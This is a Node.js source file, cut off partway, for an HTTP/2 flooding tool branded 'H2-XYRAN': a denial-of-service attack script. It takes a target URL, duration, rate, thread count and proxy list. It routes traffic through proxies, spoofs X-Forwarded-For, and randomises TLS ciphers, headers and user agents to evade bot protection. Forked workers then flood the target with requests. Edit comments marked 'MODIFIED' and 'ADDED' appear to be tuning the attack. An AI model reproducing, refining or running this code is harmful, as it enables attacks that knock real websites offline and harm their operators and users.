const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const os = require("os");
const colors = require("colors");

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const accept_header = [
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,application/vnd.openxmlformats-officedocument.wordprocessingml.document",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,application/vnd.openxmlformats-officedocument.wordprocessingml.document,application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,application/vnd.openxmlformats-officedocument.wordprocessingml.document,application/vnd.openxmlformats-officedocument.spreadsheetml.sheet,application/vnd.openxmlformats-officedocument.presentationml.presentation",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,application/vnd.openxmlformats-officedocument.wordprocessingml.document,application/vnd.openxmlformats-officedocument.spreadsheetml.sheet,application/vnd.openxmlformats-officedocument.presentationml.presentation,application/pdf",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,application/vnd.openxmlformats-officedocument.wordprocessingml.document,application/vnd.openxmlformats-officedocument.spreadsheetml.sheet,application/vnd.openxmlformats-officedocument.presentationml.presentation,application/pdf,application/zip",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,application/vnd.openxmlformats-officedocument.wordprocessingml.document,application/vnd.openxmlformats-officedocument.spreadsheetml.sheet,application/vnd.openxmlformats-officedocument.presentationml.presentation,application/pdf,application/zip,application/x-gzip",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,application/vnd.openxmlformats-officedocument.wordprocessingml.document,application/vnd.openxmlformats-officedocument.spreadsheetml.sheet,application/vnd.openxmlformats-officedocument.presentationml.presentation,application/pdf,application/zip,application/x-gzip,application/x-bzip2",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,application/vnd.openxmlformats-officedocument.wordprocessingml.document,application/vnd.openxmlformats-officedocument.spreadsheetml.sheet,application/vnd.openxmlformats-officedocument.presentationml.presentation,application/pdf,application/zip,application/x-gzip,application/x-bzip2,application/x-lzma",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel",
  "text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8" 
];

const language_header = [ // Shortened for brevity in this example, use your full list
    'ko-KR',
    'en-US',
    'zh-CN',
    'zh-TW',
    'ja-JP',
    'en-GB',
    'en-AU',
    'en-GB,en-US;q=0.9,en;q=0.8',
    'en-GB,en;q=0.5',
    'en-CA',
    'en-UK, en, de;q=0.5',
    'en-NZ',
    'en-GB,en;q=0.6',
    'en-ZA',
    'en-IN',
    'en-PH',
    'en-SG',
    'en-HK',
    'en-GB,en;q=0.8',
    'en-GB,en;q=0.9',
    ' en-GB,en;q=0.7',
    'en-US,en;q=0.9',
    'en-GB,en;q=0.9',
    'en-CA,en;q=0.9',
    'en-AU,en;q=0.9',
    'en-NZ,en;q=0.9',
    'en-ZA,en;q=0.9',
    'en-IE,en;q=0.9',
    'en-IN,en;q=0.9',
    'ar-SA,ar;q=0.9',
    'az-Latn-AZ,az;q=0.9',
    'be-BY,be;q=0.9',
    'bg-BG,bg;q=0.9',
    'bn-IN,bn;q=0.9',
    'ca-ES,ca;q=0.9',
    'cs-CZ,cs;q=0.9',
    'cy-GB,cy;q=0.9',
    'da-DK,da;q=0.9',
    'de-DE,de;q=0.9',
    'el-GR,el;q=0.9',
    'es-ES,es;q=0.9',
    'et-EE,et;q=0.9',
    'eu-ES,eu;q=0.9',
    'fa-IR,fa;q=0.9',
    'fi-FI,fi;q=0.9',
    'fr-FR,fr;q=0.9',
    'ga-IE,ga;q=0.9',
    'gl-ES,gl;q=0.9',
    'gu-IN,gu;q=0.9',
    'he-IL,he;q=0.9',
    'hi-IN,hi;q=0.9',
    'hr-HR,hr;q=0.9',
    'hu-HU,hu;q=0.9',
    'hy-AM,hy;q=0.9',
    'id-ID,id;q=0.9',
    'is-IS,is;q=0.9',
    'it-IT,it;q=0.9',
    'ja-JP,ja;q=0.9',
    'ka-GE,ka;q=0.9',
    'kk-KZ,kk;q=0.9',
    'km-KH,km;q=0.9',
    'kn-IN,kn;q=0.9',
    'ko-KR,ko;q=0.9',
    'ky-KG,ky;q=0.9',
    'lo-LA,lo;q=0.9',
    'lt-LT,lt;q=0.9',
    'lv-LV,lv;q=0.9',
    'mk-MK,mk;q=0.9',
    'ml-IN,ml;q=0.9',
    'mn-MN,mn;q=0.9',
    'mr-IN,mr;q=0.9',
    'ms-MY,ms;q=0.9',
    'mt-MT,mt;q=0.9',
    'my-MM,my;q=0.9',
    'nb-NO,nb;q=0.9',
    'ne-NP,ne;q=0.9',
    'nl-NL,nl;q=0.9',
    'nn-NO,nn;q=0.9',
    'or-IN,or;q=0.9',
    'pa-IN,pa;q=0.9',
    'pl-PL,pl;q=0.9',
    'pt-BR,pt;q=0.9',
    'pt-PT,pt;q=0.9',
    'ro-RO,ro;q=0.9',
    'ru-RU,ru;q=0.9',
    'si-LK,si;q=0.9',
    'sk-SK,sk;q=0.9',
    'sl-SI,sl;q=0.9',
    'sq-AL,sq;q=0.9',
    'sr-Cyrl-RS,sr;q=0.9',
    'sr-Latn-RS,sr;q=0.9',
    'sv-SE,sv;q=0.9',
    'sw-KE,sw;q=0.9',
    'ta-IN,ta;q=0.9',
    'te-IN,te;q=0.9',
    'th-TH,th;q=0.9',
    'tr-TR,tr;q=0.9',
    'uk-UA,uk;q=0.9',
    'ur-PK,ur;q=0.9',
    'uz-Latn-UZ,uz;q=0.9',
    'vi-VN,vi;q=0.9',
    'zh-CN,zh;q=0.9',
    'zh-HK,zh;q=0.9',
    'zh-TW,zh;q=0.9',
    'am-ET,am;q=0.8',
    'as-IN,as;q=0.8',
    'az-Cyrl-AZ,az;q=0.8',
    'bn-BD,bn;q=0.8',
    'bs-Cyrl-BA,bs;q=0.8',
    'bs-Latn-BA,bs;q=0.8',
    'dz-BT,dz;q=0.8',
    'fil-PH,fil;q=0.8',
    'fr-CA,fr;q=0.8',
    'fr-CH,fr;q=0.8',
    'fr-BE,fr;q=0.8',
    'fr-LU,fr;q=0.8',
    'gsw-CH,gsw;q=0.8',
    'ha-Latn-NG,ha;q=0.8',
    'hr-BA,hr;q=0.8',
    'ig-NG,ig;q=0.8',
    'ii-CN,ii;q=0.8',
    'is-IS,is;q=0.8',
    'jv-Latn-ID,jv;q=0.8',
    'ka-GE,ka;q=0.8',
    'kkj-CM,kkj;q=0.8',
    'kl-GL,kl;q=0.8',
    'km-KH,km;q=0.8',
    'kok-IN,kok;q=0.8',
    'ks-Arab-IN,ks;q=0.8',
    'lb-LU,lb;q=0.8',
    'ln-CG,ln;q=0.8',
    'mn-Mong-CN,mn;q=0.8',
    'mr-MN,mr;q=0.8',
    'ms-BN,ms;q=0.8',
    'mt-MT,mt;q=0.8',
    'mua-CM,mua;q=0.8',
    'nds-DE,nds;q=0.8',
    'ne-IN,ne;q=0.8',
    'nso-ZA,nso;q=0.8',
    'oc-FR,oc;q=0.8',
    'pa-Arab-PK,pa;q=0.8',
    'ps-AF,ps;q=0.8',
    'quz-BO,quz;q=0.8',
    'quz-EC,quz;q=0.8',
    'quz-PE,quz;q=0.8',
    'rm-CH,rm;q=0.8',
    'rw-RW,rw;q=0.8',
    'sd-Arab-PK,sd;q=0.8',
    'se-NO,se;q=0.8',
    'si-LK,si;q=0.8',
    'smn-FI,smn;q=0.8',
    'sms-FI,sms;q=0.8',
    'syr-SY,syr;q=0.8',
    'tg-Cyrl-TJ,tg;q=0.8',
    'ti-ER,ti;q=0.8',
    'tk-TM,tk;q=0.8',
    'tn-ZA,tn;q=0.8',
    'tt-RU,tt;q=0.8',
    'ug-CN,ug;q=0.8',
    'uz-Cyrl-UZ,uz;q=0.8',
    've-ZA,ve;q=0.8',
    'wo-SN,wo;q=0.8',
    'xh-ZA,xh;q=0.8',
    'yo-NG,yo;q=0.8',
    'zgh-MA,zgh;q=0.8',
    'zu-ZA,zu;q=0.8',
];
const fetch_site = ["same-origin", "same-site", "cross-site", "none"];
const fetch_mode = ["navigate", "same-origin", "no-cors", "cors"];
const fetch_dest = ["document", "sharedworker", "subresource", "unknown", "worker"];
const cplist = [
    "TLS_AES_128_CCM_8_SHA256", "TLS_AES_128_CCM_SHA256", "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_AES_256_GCM_SHA384", "TLS_AES_128_GCM_SHA256"
];
const cache_header = [
    'max-age=0', 'no-cache', 'no-store', 'pre-check=0', 'post-check=0', 'must-revalidate',
    'proxy-revalidate', 's-maxage=604800', 'no-cache, no-store,private, max-age=0, must-revalidate',
    'no-cache, no-store,private, s-maxage=604800, must-revalidate',
    'no-cache, no-store,private, max-age=604800, must-revalidate',
];

var cipper = cplist[Math.floor(Math.random() * cplist.length)]; // MODIFIED: removed one Math.floor
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

const sigalgs = [
    "ecdsa_secp256r1_sha256", "rsa_pss_rsae_sha256", "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384", "rsa_pss_rsae_sha384", "rsa_pkcs1_sha384",
    "rsa_pss_rsae_sha512", "rsa_pkcs1_sha512"
];
let SignalsList = sigalgs.join(':');
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448"; // MODIFIED: x25519 was duplicated

const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    // crypto.constants.SSL_OP_NO_TLSv1_3 | // MODIFIED: Allow TLS 1.3 for better compatibility
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

if (process.argv.length < 7) {
    console.log(`Usage: node ${process.argv[1]} host time req thread proxy.txt`); // MODIFIED: Added script name
    process.exit();
}
// const secureProtocol = "TLS_method"; // MODIFIED: Removed, let Node.js negotiate or use min/max version in tls.connect
const headers = {}; // This is defined but seems unused globally, headers are built in runFlooder

const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: SignalsList,
    honorCipherOrder: true, // Client typically doesn't set this, server does. Forcing it on client might be okay.
    secureOptions: secureOptions,
    // secureProtocol: secureProtocol // MODIFIED: Removed
};

const secureContext = tls.createSecureContext(secureContextOptions);

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};
var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

const MAX_RAM_PERCENTAGE = 90; // MODIFIED: Set to 90%
const RESTART_DELAY = 1000; // milliseconds

if (cluster.isMaster) {
    console.clear();
    console.log(`\n[H2-XYRAN]`.brightBlue);
    console.log(`--------------------------------------------`.gray);
    console.log(`[+] Target: ${args.target}`.cyan);
    console.log(`[+] Time: ${args.time}s`.cyan);
    console.log(`[+] Rate: ${args.Rate}`.cyan);
    console.log(`[+] Threads: ${args.threads}`.cyan);
    console.log(`[+] Proxies: ${proxies.length}`.cyan);
    console.log(`[+] RAM Restart Threshold: ${MAX_RAM_PERCENTAGE}%`.cyan);
    console.log(`--------------------------------------------`.gray);
    console.log(`[+] Attack Sent Successfully`.green);
    console.log(`[+] Initializing ${args.threads} Threads...`.cyan);
    console.log(`--------------------------------------------`.gray);

    const restartScript = () => {
        console.log(`[MASTER] Restarting script due to policy or completion...`.yellow);
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        console.log('[MASTER] Restarting workers in'.yellow, RESTART_DELAY, 'ms...'.yellow);
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
            console.log(`[MASTER] ${args.threads} workers restarted.`.cyan);
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        // console.log(`[MASTER] Current RAM usage: ${ramPercentage.toFixed(2)}%`.grey); // Optional: for debugging RAM usage

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log(`[MASTER] Maximum RAM usage hit: ${ramPercentage.toFixed(2)}%`.red);
            restartScript();
        }
    };
    setInterval(handleRAMUsage, 5000); // Check every 5 seconds

    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }

    cluster.on('exit', (worker, code, signal) => {
        // console.log(`[MASTER] Worker ${worker.process.pid} died. Code: ${code}, Signal: ${signal}. Restarting...`.yellow); // Optional
        // cluster.fork(); // Optionally restart a worker if it dies unexpectedly, though the RAM check handles full restarts.
    });

} else {
    setInterval(runFlooder);
}

class NetSocket {
    constructor() { }

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        // const addrHost = parsedAddr[0]; // Unused
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload); // Corrected: new Buffer.from() to Buffer.from()
        
        const connection = net.connect({
            host: options.host,
            port: options.port,
        });

        connection.setTimeout(options.timeout * 1000); // MODIFIED: timeout is usually in ms
        connection.setKeepAlive(true, 60000); // MODIFIED: keepAlive usually in ms
        connection.setNoDelay(true);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                // ADDED: Logging for proxy connection failure
                console.error(`[WORKER-${process.pid}] Proxy ${options.host}:${options.port} -> ${options.address}: Invalid response: ${response.split('\r\n')[0]}`.red);
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            // ADDED: Logging for proxy connection timeout
            console.warn(`[WORKER-${process.pid}] Proxy ${options.host}:${options.port} -> ${options.address}: Timeout`.yellow);
            connection.destroy();
            return callback(undefined, "error: timeout exceeded connecting to proxy");
        });

        // ADDED: Error handling for socket connection to proxy
        connection.on("error", (err) => {
            console.error(`[WORKER-${process.pid}] Proxy ${options.host}:${options.port} -> ${options.address}: Connection error: ${err.message}`.red);
            connection.destroy();
            return callback(undefined, `error: connection error with proxy: ${err.message}`);
        });
    }
}

const Socker = new NetSocket();

function readLines(filePath) {
    try {
        return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(Boolean); // Added filter to remove empty lines
    } catch (e) {
        console.error(`[MASTER/WORKER-${process.pid}] Error reading proxy file ${filePath}: ${e.message}`.red);
        process.exit(1); // Exit if proxy file cannot be read
    }
}

function getRandomValue(arr) {
    const randomIndex = Math.floor(Math.random() * arr.length);
    return arr[randomIndex];
}

// This randstra function generates only numbers.
function randstra(length) {
    const characters = "0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomElement(elements) {
    if (!elements || elements.length === 0) return null; // Guard against empty proxy list
    return elements[randomIntn(0, elements.length -1)];
}

// randstrs and randstrsValue seems unused. If you intend to use it, ensure crypto.randomBytes is handled appropriately.
// function randstrs(length) { ... }
// const randstrsValue = randstrs(10);

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    if (!proxyAddr) {
        // console.warn(`[WORKER-${process.pid}] No proxy available, skipping flood cycle.`.yellow); // Can happen if proxy file is empty
        return;
    }
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol === "https:" ? "443" : "80"; // MODIFIED: strict equality

    // Arrays for User-Agent generation (shortened for brevity)
    const nm = ["110.0.0.0", "111.0.0.0", /* ... */ "119.0.0.0"];
    const nmx = ["120.0", "119.0", /* ... */ "111.0"];
    const nmx1 = ["105.0.0.0", "104.0.0.0", /* ... */ "97.0.0.0"];
    const sysos = ["Windows 1.01", "Windows 7", /* ... */ "Windows 10 version 1703"];
    const winarch = ["x86-16", "IA-32", /* ... */ "x86-64, Itanium"];
    const winch = ["2012 R2", "2019 R2", /* ... */ "HPC 2008"];
    const rd = ["221988", "1287172", /* ... */ "121212"];

    var nm1 = nm[Math.floor(Math.random() * nm.length)];
    var nm2 = sysos[Math.floor(Math.random() * sysos.length)];
    var nm3 = winarch[Math.floor(Math.random() * winarch.length)];
    var nm4 = nmx[Math.floor(Math.random() * nmx.length)];
    var nm5 = winch[Math.floor(Math.random() * winch.length)];
    // var nm6 = nmx1[Math.floor(Math.random() * nmx1.length)]; // nm6 is not used in user-agent string
    var kha = rd[Math.floor(Math.random() * rd.length)];

    const encoding_header = ['gzip, deflate, br', 'compress, gzip', 'deflate, gzip', 'gzip, identity'];

    function randstr(length) { // Generic alphanumeric random string
        const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        let result = "";
        for (let i = 0; i < length; i++) {
            result += characters.charAt(Math.floor(Math.random() * characters.length));
        }
        return result;
    }

    function generateRandomString(minLength, maxLength) {
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
        let randomString = '';
        for (let i = 0; i < length; i++) {
            randomString += characters.charAt(Math.floor(Math.random() * characters.length));
        }
        return randomString;
    }

    const val = {
        'NEL': JSON.stringify({
            "report_to": Math.random() < 0.5 ? "cf-nel" : 'default',
            "max_age": Math.random() < 0.5 ? 604800 : 2561000, // max-age, not max_age for NEL
            "include_subdomains": Math.random() < 0.5 ? true : false
        }),
    };

    const rateHeaders = [
        { "accept": accept_header[Math.floor(Math.random() * accept_header.length)] },
        { "Access-Control-Request-Method": "GET" }, // Typically used with OPTIONS requests
        { "accept-language": language_header[Math.floor(Math.random() * language_header.length)] },
        { "origin": "https://" + parsedTarget.host },
        // { "source-ip": randstr(5) }, // This is not a standard header, usually spoofed via X-Forwarded-For
        // {"x-aspnet-version" : randstrsValue}, // randstrsValue not defined well
        { "data-return": "false" }, // Non-standard
        { "X-Forwarded-For": parsedProxy[0] }, // Spoofing IP
        // { "NEL": val.NEL }, // NEL is a response header, not a request header. But some tools use it.
        { "dnt": "1" },
        { "A-IM": "Feed" }, // Non-standard, (Acceptable Instance Manipulations)
        { 'Accept-Range': Math.random() < 0.5 ? 'bytes' : 'none' }, // Typically a response header
        { 'Delta-Base': '12340001' }, // HTTP Delta encoding, rare
        { "te": "trailers" }, // For chunked transfer encoding trailers
    ];

    let staticHeaders = { // Renamed from 'headers' to avoid conflict with global 'headers'
        ":authority": parsedTarget.host,
        ":scheme": "https",
        ":path": parsedTarget.path + "?" + randstr(3) + "=" + generateRandomString(10, 25),
        ":method": "GET",
        "pragma": "no-cache",
        "upgrade-insecure-requests": "1",
        "accept-encoding": encoding_header[Math.floor(Math.random() * encoding_header.length)],
        "cache-control": cache_header[Math.floor(Math.random() * cache_header.length)],
        "sec-fetch-mode": fetch_mode[Math.floor(Math.random() * fetch_mode.length)],
        "sec-fetch-site": fetch_site[Math.floor(Math.random() * fetch_site.length)],
        "sec-fetch-dest": fetch_dest[Math.floor(Math.random() * fetch_dest.length)],
        "user-agent": `/5.0 (${nm2}; ${nm5}; ${nm3} ; ${kha} ${nm4}) /Gecko/20100101 Edg/91.0.864.59 ${nm4}`,
    };

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host, // MODIFIED: Just host, port is implicit 443 in CONNECT
        timeout: 10 // seconds for proxy connect
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) {
            // Error already logged in Socker.HTTP, can add more context if needed
            // console.error(`[WORKER-${process.pid}] Socker.HTTP error: ${error}`.red);
            return;
        }

        connection.setKeepAlive(true, 60000); // ms
        connection.setNoDelay(true);

        // HTTP/2 Client settings
        const http2ClientSettings = {
            enablePush: false,
            initialWindowSize: 15564991, // Standard: 65535 (2^16-1). Large values can be part of fingerprinting.
            headerTableSize: 65536,      // Max value by spec.
            maxHeaderListSize: 32768,   // Client choice, common default is lower.
            maxFrameSize: 16384,        // Standard default.
        };

        const tlsOptions = {
            // port: parsedPort, // port is part of tls.connect's first arg if connecting to a different host than servername
            secure: true,
            ALPNProtocols: ["h2"],
            ciphers: cipper, // This is a single cipher string, TLS library might expect an array or a colon-separated string. Node handles colon-separated.
            sigalgs: SignalsList,
            requestCert: true,
            socket: connection, // Tunnel TLS through the proxy connection
            ecdhCurve: ecdhCurve,
            honorCipherOrder: false, // Client usually doesn't dictate this; server does.
            rejectUnauthorized: false, // Standard for these tools, but insecure for legitimate clients
            // secureOptions: secureOptions, // Applied via secureContext
            secureContext: secureContext,
            host: parsedTarget.host, // For SNI, though servername is preferred
            servername: parsedTarget.host, // Server Name Indication
            // secureProtocol: secureProtocol // MODIFIED: Removed
            // minVersion: 'TLSv1.2', // Optionally set min/max TLS versions
            // maxVersion: 'TLSv1.3',
        };

        const tlsConn = tls.connect(Number(parsedPort), parsedTarget.host, tlsOptions); // Ensure port is number

        tlsConn.allowHalfOpen = true;
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 60000); // ms
        tlsConn.setMaxListeners(0);

        tlsConn.on('error', (err) => {
            console.error(`[WORKER-${process.pid}] TLS Error for ${parsedTarget.host} (via ${proxyAddr}): ${err.message}`.red);
            connection.destroy(); // Close underlying proxy connection
            // tlsConn.destroy(); // Already implicitly destroyed on error usually
        });

        tlsConn.on('timeout', () => {
            console.warn(`[WORKER-${process.pid}] TLS Timeout for ${parsedTarget.host} (via ${proxyAddr})`.yellow);
            tlsConn.destroy();
            connection.destroy();
        });
        
        const client = http2.connect(parsedTarget.href, {
            settings: http2ClientSettings,
            createConnection: () => tlsConn // Use the established TLS connection
        });

        client.setMaxListeners(0);
        // client.settings(http2ClientSettings); // Settings can be passed in http2.connect options directly

        client.on("connect", () => {
            // console.log(`[WORKER-${process.pid}] HTTP/2 Connected to ${parsedTarget.host} via ${proxyAddr}`.cyan); // Optional: for debugging successful connections
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const dynHeaders = {
                        ...staticHeaders,
                        ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
                        // Add more dynamic headers if needed
                    };

                    const request = client.request(dynHeaders, {
                        parent: 0, // parent and exclusive typically for prioritization, might not be needed for flooding
                        exclusive: true,
                        weight: 220, // HTTP/2 stream priority weight
                    });

                    request.on('response', (responseHeaders) => {
                        const status = responseHeaders[':status'];
                        if (status >= 200 && status < 300) {
                            // console.log(`[WORKER-${process.pid}] ${parsedTarget.host} (${proxyAddr}) Status: ${String(status).green}`);
                        } else if (status >= 300 && status < 400) {
                            console.log(`[WORKER-${process.pid}] ${parsedTarget.host} (${proxyAddr}) Status: ${String(status).blue} (Redirect: ${responseHeaders['location'] || ''})`);
                        } else if (status >= 400 && status < 500) {
                            console.warn(`[WORKER-${process.pid}] ${parsedTarget.host} (${proxyAddr}) Status: ${String(status).yellow}`);
                        } else {
                            console.error(`[WORKER-${process.pid}] ${parsedTarget.host} (${proxyAddr}) Status: ${String(status).red}`);
                        }
                        // request.close(); // Close the stream after getting headers
                        // request.destroy();
